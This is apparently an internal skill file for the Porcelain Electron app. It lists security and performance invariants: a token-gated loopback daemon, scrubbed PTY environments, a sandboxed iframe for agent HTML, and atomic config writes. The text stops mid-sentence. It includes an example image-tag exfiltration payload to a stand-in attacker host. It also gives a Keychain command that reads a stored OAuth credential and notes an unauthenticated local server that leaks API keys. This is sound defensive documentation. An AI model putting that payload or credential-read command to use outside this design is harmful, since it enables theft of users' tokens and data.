---
name: audit
metadata:
  internal: true
description: Porcelain's hard-won invariants — the security, correctness, performance, and type-safety rules the codebase must never silently regress. Read before changing the main process, IPC, config persistence, git plumbing, file reads, external-URL handling, packaging, or data-fetching wiring; and when reviewing a change for regressions. Each invariant says what to preserve, why it exists, and how to verify you didn't break it.
---

# Porcelain — invariants to preserve

A "don't regress these" checklist. These are constraints the codebase **earned**
— most were a bug, a crash, or a security gap before the fix landed. Breaking one
rarely fails a test; it fails in production. Before touching the listed area, read
the invariant; after, verify it still holds. The hard rules in `CLAUDE.md` are
assumed — this skill is the codebase-specific layer beneath them.

## Security & process boundary

- **External URLs go through `isSafeExternalUrl`** (`src/backend/external-url.ts`,
  http/https/mailto allowlist). Every `shell.openExternal` / `setWindowOpenHandler`
  path is gated. Extend `ALLOWED_PROTOCOLS` deliberately; never drop the guard.
  *Why:* an unfiltered `openExternal` runs `file://`/custom-scheme URLs from
  rendered content. *Verify:* new external-link code calls the guard.
- **`readFile` stats before it reads** and returns `{type:'too-large'}` above
  `MAX_READ_BYTES` (10 MB, `src/backend/read-limits.ts`). Never read the bytes of an
  oversized file. *Why:* a multi-GB file in a 50 GB monorepo OOMs the main process.
- **The daemon (`src/backend`) is the only OS/git/fs surface; `src/main` keeps only the Electron-native rump (dialogs, windows, updater, plugin installer).** Renderer is pure UI, no Node APIs.
  `@main/*` imports in the renderer are **type-only** (`import type`) — never
  runtime-import main code. *Why:* runtime coupling leaks Node into the bundle.
- **Never write into the user's work repos.** Per-repo state lives in the app config
  under `userData` (`~/Library/Application Support/porcelain`), keyed by repo path.
- **Dev never opens or mutates real repos.** `pnpm dev` sets `userData` to
  `porcelain-dev` before any config read and seeds recents with
  `~/Code/porcelain-playground` (`src/main/dev-config.ts`). Verification/testing
  happens in the playground, never against the user's work repos.
- **The MCP agent channel adds NO inbound network surface.** The feature-view MCP
  server (`src/mcp/`) is a standalone **stdio** process the user's agent spawns — it
  never opens a port or socket. The app *reads* and *watches* one file,
  `~/.porcelain/review-sets.json` (`review-store.ts` / `review-watch.ts`), which
  it re-validates with zod (`reviewSetsSchema`) on every read because an external
  process owns it. The MCP server **authors** the sets; the app makes exactly ONE
  write — `clearReviewSet` (user-initiated from the Feature tab's Clear button), an
  atomic tmp+rename that deletes a repo's entry (reverting to the baseline). That's a
  local home-dir file write, NOT a network surface, and the app still never authors a
  set. Don't add other app-side writes to this file, and don't "upgrade" the MCP
  channel to an in-app HTTP/MCP listener. The MCP server stays **dependency-free**
  (Node builtins only) so it runs under a plain `node`; don't add npm imports to
  `src/mcp/`, and keep tool inputs validated in `toReviewFiles`.
- **The daemon is the ONE sanctioned listener — 127.0.0.1 only, ALWAYS token-gated.**
  Since the daemon split the renderer talks to `src/backend/server.ts` over HTTP + WS
  (`daemon.ts` spawns it), so the old "the app opens no port" claim no longer holds —
  but the surface is deliberately hostile-input-hardened, and these must ALL stay true:
  (1) **The bind is loopback PLUS, optionally, enumerated private interfaces
  behind the same token** — `server.listen(port, '127.0.0.1')` ALWAYS, and when the user
  enables a setting, second listener(s) at fixed port 43117 on either the detected Tailscale
  address (100.64/10, `findTailscaleAddress`) OR the machine's RFC1918 private addresses
  (10/8, 172.16/12, 192.168/16, `findLanAddresses` — the home-LAN path) — both are two
  instances of the one `createIfaceListener` factory in `tailnet-listener.ts` sharing the
  same handlers, so the token gate applies unchanged; **never `0.0.0.0` and never any other
  interface** (the enumerated-addresses rule is the guard against accidentally serving a
  coffee-shop network — anyone proposing to "just bind 0.0.0.0 since we bind everything
  anyway" is wrong: `findLanAddresses` returns ONLY private-range addresses, never a public
  one). **Cleartext-token-on-LAN is an accepted tradeoff:** on the tailnet WireGuard encrypts
  the traffic, but on a plain home LAN the bearer token crosses the wire in cleartext (a
  sniffer on that network can capture it). This is accepted the way countless local dev tools
  accept it — for a trusted home network — BUT ONLY because the LAN bind is (a) opt-in and
  default-off, (b) recorded here, and (c) never silently widened past the enumerated private
  addresses. (2) **Auth is never optional:** every `/trpc`
  request needs `authorization: Bearer <token>` (constant-time compare over sha256
  digests, 401 otherwise) and the WS upgrade needs the `porcelain.<token>` subprotocol
  (rejected handshake without it) — loopback is reachable from any webpage the user's
  browser has open (fetch to 127.0.0.1; WebSockets carry no CORS at all), so an
  unauthenticated `/session` would hand `terminal:create` — a shell — to drive-by web
  content. (The token gate is the whole boundary: a holder can already open/read any
  path via `openRepoPath`/`readFile`, so the daemon-side repo browser `browseDirs` —
  directory names only — widens nothing.) (3) **The token never appears in argv** (`ps`-visible), **stdout** (the
  daemon's only stdout line is the port; the parent passed the token via env so it
  already knows it), **or a spawned PTY's env** (see the terminal-env invariant below).
  The remote-daemon override (Phase 4) stores its token in **plaintext** at
  `userData/remote-daemon.json` — user-owned dir, same trust as the token file — and the
  connect probe sends that token **only** to the user-typed url over the tailnet; never log it.
  (4) **CORS is scoped, never `*`** — only the dev Vite origin (`PORCELAIN_ALLOWED_ORIGIN`)
  or the packaged `null` origin is echoed; the preflight carries nothing sensitive (the
  Bearer check on the real request is the gate). Don't relax any of these to "make local
  dev easier." (5) **Static serving (Phase 3, `static-server.ts`) added a THIRD thing the
  listener answers, but it widens nothing:** requests that aren't `/trpc` (or the `/session`
  WS upgrade) get the renderer dist — GET/HEAD only, **unauthenticated by design** (the app
  shell is not secret). It MUST stay this narrow: it only ever reads files INSIDE the
  renderer dist root (`resolveStaticPath` decodes/normalizes then rejects any path escaping
  the root — traversal, encoded `%2e%2e`, absolute, backslashes; unit-tested), NEVER reads
  user files, and adds NO write surface. `/trpc` + `/session` remain the ONLY dynamic
  endpoints and keep the token gate — static assets being open doesn't loosen them. The
  index.html CSP rewrite (`rewriteCsp`) touches **only `connect-src`** (same-origin WS for
  the request Host); `img-src`/`default-src` stay the artifact backstop, byte-identical.
  Don't relax any of these to "make local dev easier." (6) **The token is the whole boundary
  ACROSS THE TAILNET TOO — accepted:** a tailnet peer presenting the token gets everything
  loopback gets, including arbitrary-path `readFile`/`writeTextFile`/`renamePath`/`trashPath`
  and `terminal:create` (a shell). That's the design (the token holder IS the user); the
  consequences are (a) the token file and `remote-daemon.json` are exactly as sensitive as
  user-level shell access on the daemon host — the same holds for a LAN peer, plus the cleartext
  caveat above (a token sniffed off the LAN grants a shell), and (b) the second-listener binds
  must never widen beyond their enumerated addresses — the tailnet's 100.64/10 match is
  range-based BY DESIGN (name-independent; see `tailnet.ts`'s comment), with the residual risk
  that non-Tailscale CGNAT interfaces exist; `findTailscaleAddress` therefore refuses ambiguous
  multi-candidate setups (logs and returns null) rather than guessing; the LAN's `findLanAddresses`
  returns ONLY RFC1918 private addresses (never public, never the CGNAT range). Don't add
  per-procedure authorization to "fix" this — repo-scoping
  the file procedures breaks the cross-repo viewer flows and was explicitly rejected.
  *Verify:* `rg -n "createServer|listen\(|http\.createServer" src/backend src/main src/mcp`
  hits the loopback listener in `src/backend/server.ts` AND the second-listener factory in
  `src/backend/tailnet-listener.ts` (at most those two `createServer` sites) and nothing in
  `src/mcp`; the loopback `listen` still passes `'127.0.0.1'`, the factory's `listen` binds only
  addresses from `findTailscaleAddress()` / `findLanAddresses()` (never `0.0.0.0`, never public),
  and all listeners share the same
  Bearer + subprotocol checks; `resolveStaticPath`/`rewriteCsp` traversal + connect-src-only
  tests in `static-server.test.ts` stay green.
- **A spawned PTY's env is scrubbed of the daemon's internals** (`terminalEnv` in
  `src/backend/terminal-env.ts`, unit-tested). The daemon process env carries the session
  token and process-mode flags that must NEVER reach a user shell: `PORCELAIN_DAEMON_TOKEN`
  (a secret — `env` in the terminal would print it) and `ELECTRON_RUN_AS_NODE` (would make
  any Electron-based binary the user launches from the terminal silently run as plain
  Node), plus the other daemon-only `PORCELAIN_*` knobs. `terminalEnv` strips the
  `DAEMON_ONLY_ENV` list and passes the user's real environment through untouched. *Why:*
  extracted from `terminal-manager.ts` (the one impure module) precisely so the strip list
  is testable. *Verify:* a new daemon env var that must not leak is added to
  `DAEMON_ONLY_ENV`; `terminal-env.test.ts` still asserts the token and `RUN_AS_NODE` are
  absent from a spawned env.
- **Agent drivers spawn the user's CLIs safely — scrubbed env, arg arrays, enumerated
  binaries.** The Agent tab's drivers (`src/backend/agents/drivers/`) launch the installed
  `claude`/`codex`/`opencode` CLIs, so they carry the same spawn discipline as PTYs plus a
  few of their own: (1) every child spawn passes `terminalEnv(process.env)` — the daemon
  token and `ELECTRON_RUN_AS_NODE` must never reach an agent CLI any more than a shell. (2)
  Spawns use **arg arrays** (`spawn`/`execFile`, no shell), never an interpolated shell
  string. (3) The **binary is resolved from an enumerated set** — an explicit
  `PORCELAIN_{CLAUDE,CODEX,OPENCODE}_BIN` override, then each `PATH` dir, then hard-coded
  well-known install locations — the renderer only ever picks a **provider enum + a model
  string**, NEVER a filesystem path, so no renderer-supplied string reaches the spawn path
  (the well-known-paths probe also exists because a GUI-launched daemon has a minimal
  `PATH`). (4) Thread files (`~/.porcelain/agent-threads/<id>.json`, `thread-store.ts`) are
  **zod-validated + size-capped on every read** and return null (drop the thread) on
  corruption rather than throwing — the daemon is the sole writer, but a corrupt/oversized
  file still can't break hydration. (5) Timeline writes are **atomic tmp+rename**
  (`writeThread`). (6) **The Claude subscription OAuth token is read, used once, and never
  surfaced.** The Claude driver's `limits()` (`claude.ts`) replicates the CLI's `GET
  /api/oauth/usage` to show quota windows, which needs the stored subscription token: it's
  read lazily (only when the Limits Quick Access group is visible → `agentLimits` is called)
  from the macOS **Keychain** (`security find-generic-password -s 'Claude Code-credentials'
  -w`, an arg array — a one-time OS prompt is acceptable) or `~/.claude/.credentials.json`
  (Linux/standalone), parsed by the pure `parseClaudeOAuthToken`. The token then leaves the
  daemon **only** in the `Authorization: Bearer` header to **exactly** `https://api.anthropic.com`
  (a hard-coded URL, wrapped in a ~5s timeout) — it is **never logged, never cached beyond the
  in-flight call, never put in an error message/event, and never crosses the tRPC-WS boundary**;
  only the derived percentages/labels (`ProviderLimits`) are returned to the renderer. Any
  failure (no token, non-200, timeout, bad JSON) returns null quietly, which is also how an
  API-key user — who has no such token and no subscription windows — is skipped. *Why:* an
  agent CLI is arbitrary code with the user's auth; the failure modes are a leaked token, a
  shell-injection via an interpolated arg, a renderer-chosen binary path, or one bad thread
  file taking down the roster. *Verify:* driver spawns pass `terminalEnv` and an arg array;
  binary resolution never consumes a renderer-supplied string; `readThread` still validates +
  caps and returns null on bad input; `writeThread` is tmp+rename; the Claude token appears
  only in the api.anthropic.com Authorization header and in no log/error/event/tRPC payload,
  and is not held past the fetch. **Accepted tradeoff — the OpenCode driver spawns a third-party
  unauthenticated loopback listener.** `opencode serve` (one per repo, `opencode.ts`) is an
  HTTP+SSE server Porcelain starts on `127.0.0.1` with `--port 0` (random ephemeral port).
  Live-verified on opencode 1.17.18 (2026-07-11): it boots warning `OPENCODE_SERVER_PASSWORD
  is not set; server is unsecured`, and with no password a state-changing `POST /session`
  (and every other route, incl. `GET /config/providers` which returns provider **API keys** in
  cleartext) is served with **no auth token at all**; the daemon's Bearer/subprotocol gate
  cannot cover it (it's a separate process we don't control). CORS is the one mitigation
  present: the `OPTIONS` preflight returns no `Access-Control-Allow-Origin`, so browser JS
  can't read its responses cross-origin — but any LOCAL process that discovers the port can
  drive it. This is accepted the SAME way the LAN-cleartext bind above is: (a) it binds
  loopback only (never `--mdns`/`0.0.0.0`), (b) the port is random and never advertised, (c)
  the child is killed on daemon exit (`process.on('exit')` reaper), and (d) it's recorded here,
  not hidden. Do NOT expose the opencode port to the renderer, bind it to a non-loopback
  interface, or pass `--mdns`; if opencode ever gains a usable token flag, set it.
- **Agent-channel review-set paths are repo-contained on read.**
  `readReviewSet` (`src/backend/review-store.ts`) drops any review-set entry whose
  path is absolute or escapes `repoPath` (`isRepoContained`), because the file
  is authored by an external process and its paths flow into
  `readFile(join(repoPath, path))`. *Why:* without it, a malicious/injected
  review set could read arbitrary local files into the feature view. *Verify:*
  new code that reads agent-supplied paths routes through the filtered set.
- **The review-comment channel is a SECOND, two-way agent channel**
  (`~/.porcelain/comments.json`, `comment-store.ts` ↔ `src/mcp/comment-file.ts`),
  kept SEPARATE from review-sets so the "app makes one write to the review-set
  channel" rule above stays intact. Here the **app** authors comments — so their
  `path`s are app-supplied, never externally injected (no repo-containment guard
  needed, unlike review-sets) — and the MCP server only reads them and flips
  `resolved` (`resolve_review_comment`). Both sides write atomically (tmp + rename);
  the app serializes its own read-modify-write. A cross-process race with an MCP
  resolve is rare and low-stakes (a lost resolve just reappears; the watcher
  re-syncs). Still stdio only, no network surface. Don't add an app-side write here
  that accepts an agent-supplied path, and keep both writers atomic. The **project
  board** (`~/.porcelain/board.json`, `board-store.ts` ↔ `src/mcp/board-file.ts`) is a
  THIRD channel of the same shape and the same rules apply: app-and-agent-authored
  *content* (not filesystem paths), atomic writes on both sides, stdio only.
- **Saved actions are agent-writable but HUMAN-executed.** The 4th channel
  (`~/.porcelain/actions.json`, `actions-store.ts` ↔ `src/mcp/action-file.ts`) is the
  same shape as the board, but its content is a *shell command* — higher stakes than
  inert card text, because an agent that writes the file could plant a command. The
  safeguards that make this acceptable, all of which must hold: (1) **nothing in the
  agent channel executes an action** — the MCP server exposes only `list/create/update/
  delete_action`, NO run tool; running is solely a human click in the app. Don't add a
  `run_action` MCP tool. (2) The **full command text is always visible** in the Actions
  Quick Access row (and its run tooltip) before the human clicks — never hide or
  truncate-without-recourse the command. (3) It runs in a **visible PTY** (the user sees
  output), via the user's login shell with the command typed in — there's no silent
  background execution. *Verify:* the MCP tool list has no execute verb; the Action row
  still shows `command`.
- **Repo notes are a READ-ONLY, app→agent channel.** The 5th channel
  (`~/.porcelain/notes.json`, `notes-store.ts` ↔ `src/mcp/notes-file.ts`) is the
  human's freeform per-repo markdown scratchpad. The **app is the SOLE writer** (the
  Notes card) and the MCP server only reads it (`get_repo_notes` — there is NO
  notes-write tool, and don't add one; notes are the human's, captured tasks belong on
  the board). Because nothing else writes it, it has **no `review-watch` entry** —
  don't add a watcher expecting agent pushes. The content is inert markdown (not a
  path, not a command), so no repo-containment or command-injection guard applies, but
  keep the app's writes atomic (tmp + rename) like the others. Notes moved here out of
  `userData/config.json` only because the dependency-free MCP can't resolve userData;
  `migrateNotesFromConfig` (startup, idempotent) carries legacy notes over and never
  clobbers a newer in-app edit. *Verify:* the MCP tool list still has only
  `get_repo_notes` for notes; the app never reads `config.repos[*].notes` except in the
  migration.
- **Flow layers are a TWO-WAY channel whose content is auto-executed regex.** The 6th
  channel (`~/.porcelain/layers.json`, `layers-store.ts` ↔ `src/mcp/layers-file.ts`,
  `get/set/reset_flow_layers`) holds the per-repo review-flow layers. Same two-way shape
  and rules as the board (app-and-agent-authored content, atomic writes both sides,
  stdio only, a `review-watch` entry → the `layers` app-event). What's DIFFERENT and must
  hold: the content is a `pattern` the main process **compiles and runs** on every flow
  build (`compileLayers` in `flow.ts`, `new RegExp(pattern, 'g')`), not inert text — so
  **the app's read MUST drop any layer whose pattern doesn't compile** (`readLayers` in
  `layers-store.ts` filters with `compilable`), or one bad agent-written pattern throws
  and breaks every grouping view (gitFlow/featureView/exploreFeature). The MCP's
  `toLayers` likewise rejects an uncompilable pattern up front. Patterns run against
  short repo-relative paths and the human can already type any valid regex in Settings →
  Review flow, so the ReDoS surface is unchanged — don't add a bespoke complexity guard
  here that the human path lacks; just keep the compile-on-read filter. Layers moved out
  of `userData/config.json` (like notes) so the dependency-free MCP can read+write them;
  `migrateLayersFromConfig` (startup, idempotent) carries a legacy override over and
  never clobbers a newer in-app edit. *Verify:* an MCP-written invalid pattern is dropped,
  not thrown, on the next flow poll; the app reads layers only from the channel (no
  `config.repos[*].layers` read outside the migration).
- **Reviewed marks are a READ-ONLY, app→agent channel.** The 7th channel
  (`~/.porcelain/reviewed.json`, `reviewed-store.ts` ↔ `src/mcp/reviewed-file.ts`,
  `Record<repoPath, { path, fingerprint }[]>` — legacy bare-string marks still parse as
  `{ path, fingerprint: '' }`) holds the paths the human has ticked as reviewed in the
  Changes/Feature lists, each keyed to a content fingerprint (sha256 of the file's diff
  vs HEAD, computed in api.ts via `reviewedFingerprint`). The app reconciles at read time
  (`reviewedPaths` → `reconcileReviewed`): a mark whose stored fingerprint no longer
  matches the file's current diff hash is pruned (silently un-ticked, written through so
  the JSON stays truthful for the MCP) — this is what clears marks after external commits,
  amends, rebases, and post-mark edits; the `gitCommit` clearing stays a fast path. An
  empty fingerprint (legacy mark) never matches, so it prunes on first reconcile. Same
  rules as the notes channel: the **app is the SOLE writer** (`markReviewed`/`unmarkReviewed`,
  `setReviewedMarks`, `clearReviewedPaths`, and the reconcile write-through) and the MCP
  server only reads it (`get_reviewed_files` — it can't run git, so it just exposes the
  path list and trusts the app's write-through; there is NO mark-write tool, and don't add one;
  "reviewed" is the human's act, not the agent's). Because nothing else writes it, it has
  **no `review-watch` entry** — don't add a watcher expecting agent pushes. Paths are
  inert here (the agent reads them as review-progress context; the app already validates
  any path it acts on), so no repo-containment guard applies, but keep the app's writes
  atomic (tmp + rename) and in-process-serialized like the others. Marks moved here out of
  `userData/config.json` (`config.repos[*].reviewedPaths`, now a deprecated optional field
  kept only for the migration) so the dependency-free MCP can read them;
  `migrateReviewedFromConfig` (startup, idempotent) carries legacy marks over and never
  clobbers a newer in-app mark. *Verify:* the MCP tool list has only `get_reviewed_files`
  for reviewed state; the app reads marks only from the channel (no
  `config.repos[*].reviewedPaths` read outside the migration).
- **The feature-view snapshot is a READ-ONLY, app→agent channel.** The 8th channel
  (`~/.porcelain/feature-view.json`, `feature-snapshot-store.ts` ↔
  `src/mcp/feature-view-file.ts`, `Record<repoPath, { name, files: { path, source, layer }[] }>`,
  exposed as `get_feature_view`) holds Porcelain's COMPUTED feature view — every file it
  renders with its **git-truth** source (`changed`/`context`/`shipped`) and flow layer. It
  exists because that git truth lives only in the main process (the dependency-free MCP has
  no git), yet the agent needs it to tell a diffed file from a context/cross-seam one — and
  `get_review_comments` now tags each comment with this source. Same shape and rules as the
  notes/reviewed channels: the **app is the SOLE writer** (`writeFeatureSnapshot`, called from
  `getFeatureBuild` on every view rebuild), the MCP server only reads it (NO write tool — and
  don't add one; the snapshot is derived, not authored), there is **no `review-watch` entry**
  (nothing pushes back), and writes stay atomic + in-process-serialized. The content is inert
  (app-supplied repo-relative paths + source/layer labels, not externally injected and not a
  filesystem path the app resolves), so no repo-containment guard applies — but it's a derived
  snapshot, refreshed only while the Feature surfaces poll, so treat it as "the view as last
  rendered," never as source of truth (the agent's own pushed set is still `get_feature_review`).
  *Verify:* the MCP tool list has only `get_feature_view` for it; the only writer is
  `writeFeatureSnapshot`; `rg -n "createServer|listen\(|http" src/mcp` still finds nothing.
- **The feature artifact is agent-authored ACTIVE content — render it ONLY in a fully
  sandboxed iframe.** The 9th channel (`~/.porcelain/artifacts.json`, `artifact-store.ts` ↔
  `src/mcp/artifact-file.ts`, `set/get/clear_feature_artifact`, `Record<repoPath, { title, html,
  updatedAt }>`) lets the agent author a self-contained HTML document that Porcelain renders in
  the viewer. Unlike every other channel's content (inert text/paths), the `html` is executable
  markup, so the safeguards that make it acceptable, all of which must hold: (1) it renders ONLY
  inside `<iframe sandbox="" srcdoc={html}>` (`artifact-view.tsx`) — the EMPTY sandbox attribute:
  no `allow-scripts`, no `allow-same-origin`, no `allow-popups`, ever. `sandbox=""` stops script
  execution, same-origin access, and navigation; `srcdoc` keeps it a self-contained document. Never
  add an `allow-*` token or swap to a `src` URL. (2) The parent CSP (`default-src 'self'; img-src
  'self' data:` in `index.html`) is the ONLY thing blocking external subresource loads (a remote
  `<img>`/stylesheet/font) — a `srcdoc` document inherits it, and sandbox alone does NOT block
  passive loads. This makes the CSP the real backstop against an HTML-only exfil channel
  (`<img src="https://attacker/?leak=...">`): never widen it (e.g. adding a remote host to
  `img-src`) while artifacts can render. The daemon split added `connect-src 'self'
  http://127.0.0.1:* ws://127.0.0.1:*` to the same CSP (the renderer must reach the local
  daemon). That loopback scope is what the Electron window loads; when the daemon serves the
  Phase-3 browser client it rewrites ONLY `connect-src` to same-origin WS for the request Host
  (`rewriteCsp` in `static-server.ts`) — it does NOT relax `img-src`/`default-src`, which
  remain the artifact backstop, and the rewrite must never touch them. `font-src 'self' data:`
  is also present and DELIBERATE (Vite inlines small font subsets — the JetBrains Mono Cyrillic
  slice — as data: URIs, which the `default-src` fallback otherwise blocks); a `data:` font is
  inert (no request leaves the machine), so it adds no exfil channel — but never add a REMOTE
  host to `font-src` (a remote font load IS a beacon). Don't widen `img-src`/`default-src`, and keep the CSP rewrite connect-src-only. (3) Reads are zod-validated + size-capped on
  EVERY read (`readArtifact` drops an entry whose html exceeds `MAX_HTML_BYTES` = 1.5 MB, and
  never throws — one bad agent write can't break the viewer), because an external process owns the
  file. Same two-way shape as review-sets: the MCP server authors it, the app makes exactly ONE
  write — `clearArtifact` (user-initiated), an atomic tmp+rename delete-entry — and it has a
  `review-watch` entry → the `artifact` event. Still stdio only, no network surface. *Verify:* the
  iframe keeps `sandbox=""` with no allow-tokens; the CSP is unchanged; `rg -n "createServer|listen\(|http" src/mcp`
  still finds nothing; the app's only write to `artifacts.json` is `clearArtifact`.
- **The agent MCP installer is the ONLY non-git file write driven by the renderer, and it takes no user input.**
  `installAgentMcp` (`src/main/agent-mcp.ts`) copies the bundled `out/main/mcp/server.js`
  to `~/.porcelain/mcp/server.js` (home, not a work repo) and writes per-agent MCP config
  files (`~/.claude.json`, `~/.codex/config.toml`, `~/.config/opencode/opencode.json`).
  The renderer supplies only the agent list (a fixed enum); no user string reaches the
  file paths or command args. It's user-initiated from Settings. Don't let any
  renderer-supplied string reach a file path or command (injection). `git`'s `execFile`
  (no shell) remains the pattern everywhere else; there are no other shell-outs.
  Two properties this design leans on, don't regress them: (1) the config points at the
  **stable** `~/.porcelain/mcp/server.js`, and `ensureMcpServer` re-copies the bundled
  server there on **every app boot** (`index.ts`, best-effort) — that's what lets an app
  update ship new/fixed MCP tools without the user re-running "Add MCP" (skills update
  separately over skills.sh, so nothing else refreshes the server). (2) The config writes
  are **atomic** (tmp+rename via `writeFileAtomic` in `agent-mcp-config.ts`), create the
  parent dir, and **preserve the existing file mode** — `~/.claude.json` holds the user's
  live Claude Code state (projects/history/auth, often 0600), so a truncate-and-write or a
  0644 rewrite would risk corruption or leak. *Verify:* `ensureMcpServer` is still called
  at boot; `agent-mcp-config.ts` writes never call bare `writeFile` on a target path.

## Config persistence

- **All config writes go through `createJsonStore`** (`src/backend/json-store.ts`):
  atomic tmp+rename writes, corrupt files backed up to `.corrupt-*`, and
  `updateConfig(mutate)` serializes read-modify-write. Never reintroduce a bare
  load→mutate→save pair. *Why:* concurrent mutations dropped writes; a crash
  mid-write corrupted `config.json`. Read-only callers may use `loadConfig`.
- **Hidden-path filtering happens in the MAIN process** (`visibleFilePaths` in
  `repo-config.ts`, tested), not the renderer — the renderer must never receive
  paths the user hid.

## Git plumbing

- **Every git invocation sets `GIT_OPTIONAL_LOCKS=0`** (`runGit` in `src/backend/git.ts`).
  *Why:* the 3s `gitStatus`/`gitFlow` background polls otherwise rewrite `.git/index`
  under a lock, racing the user's own `pull`/`commit` and failing it with
  `fatal: Unable to write index.`. The flag disables only optional refreshes;
  required locks for real mutations are untouched. Don't remove it.
- **Commit never auto-stages.** `gitCommit` = `git commit -m` on **staged** changes
  only; staging is explicit (`gitStageAll` / `gitStageFile` / `gitUnstageFile`).
  Porcelain is a review tool — silently `git add -A` on commit is surprising.
- **Quick commands run a whitelist** (`QUICK_COMMANDS` in `git.ts`), never arbitrary
  shell. New quick actions are added to the whitelist, not passed through.
- **Status listings use `-uall`** (`--untracked-files=all`) in `gitStatus` and
  `gitDiffFile`'s status probe (`git.ts`). *Why:* the default `-unormal` collapses
  an untracked directory into one `dir/` row; that row reaches the Changes list and
  `gitDiffFile` then `readFile`s the directory → `EISDIR` (blank tab + error). With
  `-uall` every new file is its own diffable row. *Verify:* new `git status` calls
  that feed the changes list keep the flag; clicking a newly-added folder's files
  diffs cleanly.

## Data fetching & IPC

- **Data fetching = tRPC (v11) + @tanstack/react-query (v5), over TWO transports since the daemon split.** `electron-trpc` is gone (abandoned at 0.7.1, never supported v11). (1) The **appRouter** (`src/backend/api.ts`, ~all procedures) is REAL tRPC over `httpBatchLink` to the local daemon (`lib/trpc.ts` → `http://127.0.0.1:<port>/trpc`); its streams and push ride the ONE zod-validated WS session (`/session`, `lib/daemon.ts`), where terminals AND watch registration (`watch:files`/`watch:dirs`) are messages, NOT procedures. (2) The **shellRouter** (the Electron-native rump — dialogs, windows, updater, plugin installers, `src/main/shell-api.ts`) still rides a serialized-HTTP shuttle over `invoke('trpc-shell')` replayed through `fetchRequestHandler` (`src/main/ipc.ts`): keep all protocol logic inside tRPC — only shuttle bytes; don't reintroduce a transport that reads tRPC internals (that's what rotted electron-trpc). Shell push (`close-tab`, `update-status`) is the dedicated `shell-event` IPC channel; daemon push is the WS session — NEITHER is a tRPC subscription (there are none). Never raw `ipcMain`/`ipcRenderer` for data; never cast (`as unknown as` is banned repo-wide).
- **Components never import `@renderer/lib/trpc` OR `@renderer/lib/daemon`**
  (Biome `noRestrictedImports` override on `components/**`, now lint-enforced for
  both). All server access goes through domain hooks (`hooks/use-<domain>.ts`)
  that own their post-mutation invalidation; the daemon WS session is reached only
  through `use-app-events` / `use-terminal-channel` / `use-files` / `use-agent-channel`. The vanilla
  tRPC client is sanctioned only in `stores/repo.ts` and `use-app-events.ts`.
- **Never `void` a promise** to silence a floating-promise lint — use `async`/`await`
  or `await Promise.all([...])` for invalidation/prefetch/clipboard.
- **The shell forks the daemon via `utilityProcess.fork` — NEVER via
  `spawn(process.execPath, …, ELECTRON_RUN_AS_NODE)`.** Packaged builds fuse `RunAsNode`
  OFF (`build/after-pack.js`) and the fuse silently IGNORES the env var, so a
  child_process spawn boots the child as a second full GUI app whose own `startDaemon()`
  spawns another — a recursive fork bomb (caught in the v0.19.0 pre-publish fuse check;
  dev/e2e never see it because they run unfused). `utilityProcess` runs the script in a
  real Node environment regardless of the fuse and node-pty's Electron-ABI build stays
  valid. Lifecycle semantics differ from child_process: only `spawn`/`exit` events exist
  (no `error`), so every way down lands on `exit` — `onChildDown` and `awaitReadyLine`'s
  reject both key off it, with the `wentDown`/`cleanup` flags still guarding against a
  double signal. The shell also sets `PORCELAIN_NO_STDIN_WATCHDOG=1` (a utility child has
  no stdin; Electron owns its lifetime). *Verify:* `kill -9` the daemon while the app runs
  → it restarts and the UI recovers; in a packaged build exactly ONE process has
  `daemon/server.js` in argv (see the `releasing` fuse smoke test).
- **On WS-session close, DETACH senders (PTYs survive) — but still reject every in-flight/queued
  terminal create AND attach and clear the outbox** (`failPendingCreates` in `lib/daemon.ts`,
  from `ws.onclose`; `session.dispose` → `detachSender`, NOT a kill). *Why:* Phase 2 decouples
  a PTY's lifetime from the connection, so a dropped socket must not end a shell — the daemon
  only removes that sender from each session's attached set, and a reconnecting client
  re-attaches (replaying scrollback) to resume. But a `createTerminal`/`attachTerminal` promise
  whose reply died with the socket would still hang forever, and replaying a stale
  `terminal:create` from the outbox on a much-later reconnect would spawn an abandoned shell
  nobody awaits — so both pendings are rejected (attaches drop their id so the next hydrate
  retries). Reconnect DOES re-register watch sets (from `lastWatched*`), re-attach every
  streamed terminal (from `attachedIds`), and flush the outbox on a *live* open — but a dropped
  socket's pending creates/attaches are rejected, not replayed. Don't make creates auto-replay,
  and don't reintroduce a kill-on-close path.
- **A session's scrollback is byte-capped (64KB, `scrollback-buffer.ts`).** *Why:* attach
  replays a session's retained output into the reconnecting client's xterm, so it must be
  remembered — but a long-running shell (dev server, chatty build) would grow daemon memory
  without bound. The buffer keeps only the newest ≤64KB (oldest chunks dropped). Don't remove
  or unbound the cap. *Verify:* `scrollback-buffer.test.ts` (over-cap trimming keeps newest).

## Performance (must stay fast on a 50 GB monorepo)

- **Never render all lines of a file.** File viewer and diffs render through
  `VirtualRows` (`@tanstack/react-virtual`); Shiki tokenizes only mounted rows.
- **Never index what isn't visible.** File tree = lazy per-directory `readDir` on
  expand; nothing indexed up front. `git ls-files` is cached/stale-while-revalidate.
- **`optimizeDeps.entries` must cover `src/**/*.{ts,tsx}`** so every `@base-ui/react/*`
  entry is pre-bundled. *Why:* a dep discovered lazily mid-session re-optimizes,
  loads a second React copy, and crashes with "Invalid hook call".
- **Git queries are live, fs queries are cached.** `gitFlow` (staleTime 0 + 3s poll)
  and `gitDiffFile` (staleTime 0) must reflect the working tree; fs-backed queries
  keep the 30s default. The 3s poll is cheap only because main memoizes flow on a
  status+numstat+layers key (`flowCache`) — don't break that key.
- **Open file documents stay fresh by a watcher, NOT by polling `readFile`.** The
  agent editing a file in the terminal must show up in the viewer, but giving
  `readFile` a `refetchInterval` would re-read every open file on a timer and throw
  away the 30s cache. Instead the renderer pushes its open file-tab paths (`watchFiles`,
  `useWatchOpenFiles`) and main watches just **those files' directories** (`file-watch.ts`),
  emitting `working-tree` → invalidate `readFile` + `gitDiffFile`. *Why dirs, not the
  tree:* a recursive watch on a 50 GB repo is the thing this rule exists to avoid, and
  it would drown in `.git`/`node_modules` churn — watching the handful of open files'
  dirs (filtered by basename, surviving tmp+rename) is O(open tabs). Don't "upgrade" it
  to a recursive working-tree watch, and don't make `readFile` poll.
- **The Files tree stays fresh by a watcher, NOT by polling `readDir`.** Same shape as
  the open-files watcher: the renderer pushes the set of currently-**expanded** dir paths
  (`watchDirs`, `useWatchTreeDirs`, tracked in the `tree-dirs` store) and main
  (`setWatchedDirs` in `file-watch.ts`) puts ONE non-recursive `fs.watch` on each,
  emitting the window-targeted `file-tree` event → invalidate `readDir` + `pinnedEntries`
  + `gitFlow`. This stays O(expanded dirs): `.git` events are dropped (git's index churn
